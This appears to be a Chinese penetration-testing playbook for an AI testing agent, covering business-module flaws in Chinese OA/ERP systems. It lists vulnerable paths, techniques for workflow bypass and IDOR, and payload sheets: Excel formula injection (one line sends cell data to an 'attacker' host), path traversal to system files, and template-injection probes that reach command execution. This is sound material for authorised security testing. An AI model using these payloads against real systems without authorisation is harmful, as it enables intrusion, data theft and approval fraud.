# CN OA/ERP 系统特有功能模块漏洞

> **定位**:厂商指纹已识别(见 `skills/fingerprint/recon-product-fingerprint.md`)之后,针对 OA/ERP **业务功能模块**的越权与利用模式。本文不重复厂商识别,只讲"知道是某家 OA 之后,具体功能模块的洞怎么挖"。

## Triggers (何时用)

- 已识别目标为国产 OA/ERP(致远 / 泛微 / 用友 / 浪潮 / 通达 / 蓝凌 / 华天 / 金和 / 致翔)
- 看到 `/seeyon/` `/weaver/` `/nc/` `/uapws/` `/general/myoa/` `/oaapie6/` 等路径前缀
- 抓包里有 `workflowId` `processId` `docId` `sealId` `fileId` `attachId` `templateId` 等业务参数
- 报销 / 审批 / 考勤 / 公文 / 印章 / 档案 等中文业务功能点

## Coverage points (查什么)

- **工作流越权**:改 `workflowId`/`processInstanceId` 看他人流程详情;改 `nextAssignee`/`nextUserId` 指定下一审批人;已审批节点回退(`action=rollback`);绕过审批人直接通过(`action=pass` 跳节点)
- **Excel 导入**:上传 `.xls` 触发 POI 解析 → 公式注入(`=cmd|'/c calc'!A1`)/ CSV 注入;上传模板触发 SSTI(Freemarker/Velocity);导入接口未鉴权直接写库
- **模板引擎 SSTI**:OA 后台模板 / 邮件模板 / 公文模板 / 打印模板用 Freemarker/Velocity/Thymeleaf → `${7*7}` `#set($x=7*7)` 探测
- **档案 / 附件任意下载**:`fileId`/`attachId`/`docId`/`filePath` 参数可控 → 遍历他人附件 / 路径穿越读系统文件(`/etc/passwd` `C:\windows\win.ini`)
- **印章管理越权**:下载他人印章(`sealId` 遍历)/ 上传替换他人印章 / 印章图片接口未鉴权
- **公文流转 IDOR**:`docId`/`postId`/`affairId` 遍历他人公文;`recieverId` 改任意人实现公文钓鱼
- **考勤 / 报销金额篡改**:前端 JS 校验金额 → 改请求 body 金额 / 负数 / 越权改他人单据(`billId` 替换)
- **移动端 API 暴露**:OA 移动版(`/seeyon/m3/` `/mobile/` `/oaapie6/api`)常忘鉴权或鉴权弱(token 可置空)
- **公文 / 流程附件在线预览**:`onlinePreview` `/preview` 接口 + `url`/`fileUrl` 参数 → SSRF / 任意文件读

## Common misses (AI 常忘)

- 只测登录后功能,漏了 **OA 移动版接口鉴权常常和 PC 版独立**(PC 要 token,移动版不要)
- 工作流越权只改 `workflowId`,漏了 **`affairId`/`nodeId`/`activityId` 才是节点级标识**,改这些才能跳节点 / 回退
- Excel 导入只测文件上传漏洞,漏了 **公式注入需目标用户用 Excel/WPS 打开才触发**(报告要写"需诱导打开")
- 印章管理只测下载,漏了 **替换他人印章 = 业务欺诈**(高危,但需证明影响)
- 模板 SSTI 在后台才有的就放过 → OA 后台权限本身就是攻击面(可拿后台权限后做 SSTI 提权到 RCE)
- 报销金额只测自己单据,漏了 **越权改他人已审批单据金额**(改 `billId` + `status` 回退到草稿)
- 附件下载接口只测路径穿越,漏了 **未授权遍历他人附件**(业务数据泄露,中等危但批量影响大)

## Verification (verified 标准)

- 工作流越权:看到他人流程详情(申请人/审批意见/附件)= 真;只看到自己流程的 200 = 误报
- Excel 公式注入:导入后系统存储了公式字符串且预览/导出时执行 = 真;只存储未执行 = 待用户打开验证
- 模板 SSTI:`${7*7}` 返回 `49` / `#set` 后变量被求值 = 真;原样回显 = 未渲染
- 附件任意下载:能下载到非本人附件 / 路径穿越读到系统文件 = 真;404 / 权限不足 = 误报
- 印章越权:能下载到他人印章图片 / 替换成功 = 真;只看到自己印章 = 误报
- 报销金额篡改:改后单据状态/金额实际生效(查列表确认)= 真;前端显示但后端未存 = 误报

## Related playbooks

- 厂商指纹识别 → `skills/fingerprint/recon-product-fingerprint.md`
- CN N-day 历史漏洞匹配 → `skills/fingerprint/nday-fingerprints.yaml`
- 鉴权绕过通用打法 → `skills/api-logic/auth-bypass.md`
- IDOR/BOLA 通用 → `skills/api-logic/idor-bola.md`
- 国密 / OA 密码套娃 → `skills/cn-specific/cn-crypto.md`
- CN 认证流程(扫码/SSO/短信)→ `skills/cn-specific/cn-auth.md`
- 自研加密 / 签名逆向 → `skills/js-reverse/crypto-sign.md`

## Reference (深度参考 — AI 可能不会的细节)

### 致远 OA (A8/A6/V5/M3) 关键路径与字段

```
/seeyon/htmlofficeservlet                 ← A8 历史反序列化(CNVD-2022-77692),先 GET 探活
/seeyon/thirdpartyDashboard.do            ← 第三方集成入口,常未鉴权
/seeyon/fileUpload.do                     ← 任意文件上传(老版本)
/seeyon/ajax.do?method=ajaxAction&managerName=xxx  ← ajax 反射调用 manager
/seeyon/customize/<x>/                    ← 客户化目录(详见 recon-product-fingerprint.md)
/seeyon/m3/                               ← 移动版接口,鉴权常独立
/seeyon/rest/                             ← REST 接口
```

- 工作流参数:`workflowId`(流程定义) / `processId`(流程实例) / `affairId`(待办,核心越权点) / `nodeId`(节点) / `summaryId`(公文)
- 移动版 token:常是 `token=<base64>`,部分老版本 `token=` 空值即可调用
- 致远 `ajax.do` 反射调用:测 `managerName=organizationManager` `method=listAllOrganization` 等管理方法是否未鉴权

### 泛微 e-cology / e-office 关键路径与字段

```
/weaver/lnfo.jsp                          ← 历史信息泄露(/lnfo.jsp 不是 /info.jsp)
/weaver/bsh.servlet.BshServlet            ← BeanShell 执行(CNVD-2022-64434)
/api/ec/devtools/workflow/xmlViewer.jsp   ← 历史 SQLi
/WorkerResource?action=xxx                ← 工作流入口
/WorkflowCenterTree                       ← 流程中心
/mobile/plugin/1/                         ← 移动版插件
/weaver/weaver.email.FileDownloadLocation ← 附件下载
```

- 工作流参数:`workflowid`(流程定义) / `requestid`(流程实例,**核心越权点**) / `nodeid` / `nodemark`
- e-office(轻量版)路径前缀 `/eoffice/` / `/general/`,与 e-cology 鉴权体系不同
- 附件下载:`/weaver/weaver.email.FileDownloadLocation?fileid=<int>` fileid 整型遍历
- 印章接口:`/weaver/weaver.sm.SealSetting` 老版本未鉴权

### 用友 NC / NC Cloud / UFIDA 关键路径

```
/servlet/~ic/bsh.servlet.BshServlet       ← BeanShell(NC 经典)
/uapws/service                             ← WebService 入口
/nccloud/                                  ← NC Cloud 前缀
/servlet/FileServlet                       ← 文件操作
/yer/                                      ← NC 业务前缀
```

- 反序列化:NC 多个 servlet 入口历史上可触发 fastjson / xstream 链
- 用户字段:`userid` / `pk_org`(组织主键) / `cuserid`(字符型用户 ID) / `pk_user`
- NC Cloud 移动版:`/nccloud/mobile/` 鉴权常独立

### 浪潮 GS / 致翔 / 通达 / 蓝凌 / 华天 / 金和 简表

| 厂商 | 关键路径 | 越权字段 | 备注 |
|---|---|---|---|
| 浪潮 GS | `/servlet/FileServlet` `/crm/sfdc/servlet` `/igs/` | `userid` `orgid` | 反序列化历史;移动 `/igs/m/` |
| 致翔 OA | `/oaapie6/api` `/api/` | `userid`(可置空回退默认用户) | SSO userId 回退见 `auth-bypass.md` §六 |
| 通达 OA | `/general/myoa/intor` `/general/` `/inc/` | `user` `uid` | 模板注入历史;`/general/hr/manage/query.php` 信息泄露 |
| 蓝凌 OA | `/sys/` `/km/` `/landray/` | `fdId` `docId` | LandrayOA 历史未授权 + SSRF |
| 华天动力 | `/oa/` `/htoa/` | `userid` `flowid` | 工作流越权常见 |
| 金和 OA | `/c6/` `/jh/` | `UserID` `OperID` | 老版本 SQLi 普遍 |

### 各家 OA 用户主键字段命名差异(改参数越权时必查)

| 厂商 | 用户 ID 字段 | 组织/部门字段 | 流程实例字段 |
|---|---|---|---|
| 致远 | `userId` `memberId` | `accountId` `departmentId` | `affairId` `summaryId` |
| 泛微 | `userid` `loginid` | `subcompanyid` `departmentid` | `requestid` |
| 用友 NC | `cuserid` `userid` | `pk_org` `pk_dept` | `billid` `vbillcode` |
| 浪潮 | `userid` | `orgid` | `flowInsId` |
| 通达 | `user` `uid` | `dept_id` | `run_id` |
| 蓝凌 | `fdId` | `orgFdId` | `fdId`(公文) |
| 金和 | `UserID` `OperID` | `OrgID` | `flowId` |

> **挖洞公式**:抓到任一业务请求 → 把上表中"用户 ID 字段"替换为他人值(枚举/置空/改 1)→ 看是否返回他人数据。批量越权常出在高危。

### 工作流越权三种核心模式

1. **节点跳过**:`action=pass` + `nodeId=<当前节点>` 但不带审批意见 → 部分实现仅校验"当前节点是否属于我"而不校验"我是否是审批人"
2. **回退到任意节点**:`action=rollback` + `targetNodeId=<任意>` → 老版本不校验 target 是否在前序路径上,可回退到提交节点改申请人
3. **指定下一审批人**:`nextAssignee=<任意userid>` → 部分实现允许当前处理人任意指定下游,可实现"自己审批自己"

### Excel 导入公式注入 payload 速查

```
=cmd|'/c calc'!A1                          ← Windows 弹计算器(证明)
=HYPERLINK("http://attacker/?x="&A1,"点击") ← 钓鱼外带数据
@SUM(1+9)*cmd|'/c calc'!A0                 ← 绕部分过滤(@ 开头)
```

报告写法:"需目标用户用 Excel/WPS 打开并允许公式执行" — 真实危害依赖用户行为,评级中危为主。

### 模板 SSTI 探测 payload(OA 后台 / 邮件 / 公文模板)

```
Freemarker:  ${7*7}            ${"freemarker"}?eval
Velocity:    #set($x=7*7)      $x
Thymeleaf:   __${7*7}__        ${T(java.lang.Runtime).getRuntime()}
Beetl:       ${7*7}            @ java.lang.Runtime.getRuntime().exec("id")
```

OA 模板引擎以 Freemarker + Velocity 最常见;致远 / 泛微后台模板编辑是高频 RCE 落地点。
